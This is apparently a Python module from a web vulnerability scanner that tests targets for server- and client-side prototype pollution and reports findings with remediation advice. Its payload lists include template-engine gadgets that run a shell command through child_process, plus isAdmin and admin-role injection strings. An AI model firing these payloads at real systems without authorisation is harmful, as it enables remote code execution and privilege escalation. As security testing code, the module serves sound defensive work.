"""
Prototype Pollution Tester — Detects prototype pollution in both
client-side JavaScript and server-side Node.js/Express applications.

Covers:
  - Server-side prototype pollution via JSON body (__proto__, constructor.prototype)
  - Client-side prototype pollution via URL fragment / query parameters
  - Recursive merge gadget detection
  - Property injection via dot-path traversal
"""
import json
import logging

from apps.scanning.engine.testers.base_tester import BaseTester

logger = logging.getLogger(__name__)

# ── Payloads ─────────────────────────────────────────────────────────────────
SERVER_SIDE_PAYLOADS = [
    # Classic __proto__ pollution
    {'__proto__': {'polluted': 'true'}},
    {'__proto__': {'isAdmin': True}},
    {'__proto__': {'status': 200}},
    {'constructor': {'prototype': {'polluted': 'true'}}},
    # Nested merge gadgets
    {'__proto__': {'toString': 'polluted'}},
    {'__proto__': {'valueOf': 'polluted'}},
    {'__proto__': {'hasOwnProperty': 'polluted'}},
    # Express/Lodash specific
    {'__proto__': {'outputFunctionName': 'x;process.mainModule.require("child_process").exec("id")//'}},
    {'__proto__': {'escapeFunction': 'x;process.mainModule.require("child_process").exec("id")//'}},
    # EJS/Pug template gadgets
    {'__proto__': {'client': True, 'debug': True}},
    {'__proto__': {'compileDebug': True}},
    {'__proto__': {'self': True}},
]

CLIENT_SIDE_PAYLOADS = [
    # URL fragment/query parameter based
    '__proto__[polluted]=true',
    '__proto__.polluted=true',
    'constructor[prototype][polluted]=true',
    'constructor.prototype.polluted=true',
    '__proto__[isAdmin]=true',
    '__proto__[role]=admin',
    # Encoded variants
    '__proto__%5Bpolluted%5D=true',
    'constructor%5Bprototype%5D%5Bpolluted%5D=true',
]

# Paths commonly vulnerable to merge/extend operations
MERGE_ENDPOINTS = [
    '/api/user/settings',
    '/api/user/profile',
    '/api/config',
    '/api/settings',
    '/api/preferences',
    '/api/update',
    '/api/merge',
    '/api/users/me',
    '/graphql',
]


class PrototypePollutionTester(BaseTester):
    """Detects server-side and client-side prototype pollution vulnerabilities."""

    TESTER_NAME = 'Prototype Pollution'
    REQUEST_TIMEOUT = 10

    def test(self, page, depth: str = 'medium', recon_data: dict = None) -> list:
        """Test for prototype pollution vulnerabilities."""
        vulns = []
        target = getattr(page, 'url', '')

        # Determine tech stack to prioritize
        has_node = self._has_technology(recon_data, 'node') or self._has_technology(recon_data, 'express')

        # Server-side prototype pollution via JSON bodies
        vulns.extend(self._test_server_side(target, depth, has_node))

        # Client-side prototype pollution via URL parameters
        vulns.extend(self._test_client_side(target, depth))

        # Deep: test dot-path traversal in query parameters
        if depth == 'deep':
            vulns.extend(self._test_dot_path_traversal(target))

        return vulns

    def _test_server_side(self, target: str, depth: str, has_node: bool) -> list:
        """Test JSON merge endpoints for server-side prototype pollution."""
        vulns = []
        max_payloads = 3 if depth == 'shallow' else (7 if depth == 'medium' else len(SERVER_SIDE_PAYLOADS))
        payloads = SERVER_SIDE_PAYLOADS[:max_payloads]

        for endpoint in MERGE_ENDPOINTS:
            url = target.rstrip('/') + endpoint
            headers = {'Content-Type': 'application/json'}

            for payload in payloads:
                # Send polluted JSON body
                resp = self._make_request('PUT', url, json=payload, headers=headers)
                if not resp:
                    resp = self._make_request('POST', url, json=payload, headers=headers)
                if not resp:
                    resp = self._make_request('PATCH', url, json=payload, headers=headers)

                if not resp:
                    continue

                # Check if pollution was accepted
                status = resp.status_code
                body = resp.text or ''

                if status in (200, 201):
                    if self._check_pollution_indicators(body, payload):
                        severity = 'critical' if has_node else 'high'
                        payload_str = json.dumps(payload)

                        vulns.append(self._build_vuln(
                            name='Server-Side Prototype Pollution',
                            severity=severity,
                            category='Injection',
                            description=(
                                f'The endpoint {url} is vulnerable to server-side prototype '
                                f'pollution. The JSON body with __proto__ or constructor.prototype '
                                f'properties was accepted and processed, potentially polluting '
                                f'the Object prototype on the server.'
                            ),
                            impact=(
                                'Remote Code Execution (via template engine gadgets), '
                                'privilege escalation (isAdmin pollution), authentication '
                                'bypass, denial of service, or property injection across '
                                'all objects in the application.'
                            ),
                            remediation=(
                                '1. Use Object.create(null) for merge targets. '
                                '2. Sanitize __proto__ and constructor keys from JSON input. '
                                '3. Use Map() instead of plain objects for user data. '
                                '4. Apply schema validation to reject prototype-polluting keys. '
                                '5. Use libraries like lodash >= 4.17.12 with built-in protection.'
                            ),
                            cwe='CWE-1321',
                            cvss=9.0 if has_node else 7.5,
                            affected_url=url,
                            evidence=f'Payload: {payload_str}\nStatus: {status}\nResponse: {body[:300]}',
                        ))
                        return vulns  # One finding per endpoint set is sufficient

                elif status == 500:
                    # Server error may indicate pollution causing crash
                    vulns.append(self._build_vuln(
                        name='Possible Server-Side Prototype Pollution (DoS)',
                        severity='medium',
                        category='Injection',
                        description=(
                            f'Sending a prototype pollution payload to {url} caused a '
                            f'server error (HTTP 500), suggesting the server attempts to '
                            f'process __proto__ properties and may be partially vulnerable.'
                        ),
                        impact='Denial of service via prototype pollution crash.',
                        remediation=(
                            '1. Sanitize __proto__ and constructor keys from all JSON input. '
                            '2. Implement proper error handling for malformed objects.'
                        ),
                        cwe='CWE-1321',
                        cvss=5.3,
                        affected_url=url,
                        evidence=f'Payload: {json.dumps(payload)}\nServer returned 500.',
                    ))

        return vulns

    def _test_client_side(self, target: str, depth: str) -> list:
        """Test for client-side prototype pollution via URL parameters."""
        vulns = []
        max_payloads = 3 if depth == 'shallow' else len(CLIENT_SIDE_PAYLOADS)

        for payload in CLIENT_SIDE_PAYLOADS[:max_payloads]:
            # Test via query parameter
            separator = '&' if '?' in target else '?'
            polluted_url = f'{target}{separator}{payload}'

            resp = self._make_request('GET', polluted_url)
            if not resp:
                continue

            body = resp.text or ''

            # Check if the page loads JS that may be affected by prototype pollution
            if resp.status_code == 200:
                # Look for indicators of client-side pollution susceptibility
                if self._check_client_side_indicators(body):
                    vulns.append(self._build_vuln(
                        name='Potential Client-Side Prototype Pollution',
                        severity='medium',
                        category='Injection',
                        description=(
                            f'The URL {polluted_url[:200]} was processed without error, and '
                            f'the page contains JavaScript patterns susceptible to client-side '
                            f'prototype pollution (object spread, Object.assign, deep merge).'
                        ),
                        impact=(
                            'Client-side prototype pollution can lead to XSS, DOM manipulation, '
                            'bypass of client-side security checks, or privilege escalation '
                            'in single-page applications.'
                        ),
                        remediation=(
                            '1. Validate and sanitize URL parameters on the client. '
                            '2. Use Object.create(null) for configuration objects. '
                            '3. Freeze prototypes: Object.freeze(Object.prototype). '
                            '4. Use --frozen-intrinsics flag in Node.js environments.'
                        ),
                        cwe='CWE-1321',
                        cvss=6.1,
                        affected_url=polluted_url[:200],
                        evidence='Page contains merge/spread patterns and accepts __proto__ params.',
                    ))
                    break

            # Test via URL fragment
            fragment_url = f'{target}#{payload}'
            resp2 = self._make_request('GET', fragment_url)
            if resp2 and resp2.status_code == 200:
                body2 = resp2.text or ''
                if 'hashParams' in body2 or 'location.hash' in body2:
                    vulns.append(self._build_vuln(
                        name='Client-Side Prototype Pollution via URL Fragment',
                        severity='medium',
                        category='Injection',
                        description=(
                            f'The page at {target} processes URL fragments and is susceptible '
                            f'to prototype pollution via hash parameters.'
                        ),
                        impact='Client-side XSS or DOM manipulation via prototype pollution.',
                        remediation=(
                            '1. Do not parse URL fragments as key-value pairs without sanitization. '
                            '2. Filter __proto__ and constructor from parsed hash params.'
                        ),
                        cwe='CWE-1321',
                        cvss=6.1,
                        affected_url=fragment_url[:200],
                        evidence='Page uses location.hash parsing.',
                    ))
                    break

        return vulns

    def _test_dot_path_traversal(self, target: str) -> list:
        """Test dot-path parameter names for property injection."""
        vulns = []
        dot_paths = [
            'user.__proto__.isAdmin=true',
            'config.__proto__.debug=true',
            'settings.constructor.prototype.admin=true',
        ]

        for path_payload in dot_paths:
            separator = '&' if '?' in target else '?'
            url = f'{target}{separator}{path_payload}'
            resp = self._make_request('GET', url)

            if resp and resp.status_code == 200:
                body = resp.text or ''
                if 'isAdmin' in body or 'debug' in body or '"admin":true' in body:
                    vulns.append(self._build_vuln(
                        name='Prototype Pollution via Dot-Path Parameter',
                        severity='high',
                        category='Injection',
                        description=(
                            f'The application at {target} processes dot-path parameters '
                            f'that can traverse into __proto__ or constructor.prototype, '
                            f'enabling prototype pollution via GET parameters.'
                        ),
                        impact='Privilege escalation, authentication bypass.',
                        remediation=(
                            '1. Reject parameter names containing __proto__ or constructor. '
                            '2. Use allowlist-based parameter parsing. '
                            '3. Sanitize dot-path resolution to prevent prototype access.'
                        ),
                        cwe='CWE-1321',
                        cvss=8.0,
                        affected_url=url[:200],
                        evidence=f'Dot-path payload reflected: {path_payload}',
                    ))
                    break

        return vulns

    def _check_pollution_indicators(self, body: str, payload: dict) -> bool:
        """Check if server response indicates successful pollution."""
        body_lower = body.lower()

        # Check if polluted properties appear in response
        if '"polluted"' in body_lower or '"isadmin"' in body_lower:
            return True

        # Check if response reflects __proto__ properties
        if '__proto__' in body and ('true' in body_lower or 'polluted' in body_lower):
            return True

        # Check for changed behavior (e.g., status field pollution)
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                if data.get('polluted') == 'true' or data.get('isAdmin') is True:
                    return True
        except Exception:
            pass

        return False

    def _check_client_side_indicators(self, body: str) -> bool:
        """Check if page JavaScript is susceptible to prototype pollution."""
        susceptible_patterns = [
            'Object.assign(',
            '$.extend(',
            'jQuery.extend(',
            '_.merge(',
            '_.defaultsDeep(',
            'deepmerge(',
            'merge(',
            '...config',
            '...options',
            '...settings',
            'Object.keys(',
            'for (var',
            'for (let',
        ]
        return any(p in body for p in susceptible_patterns)
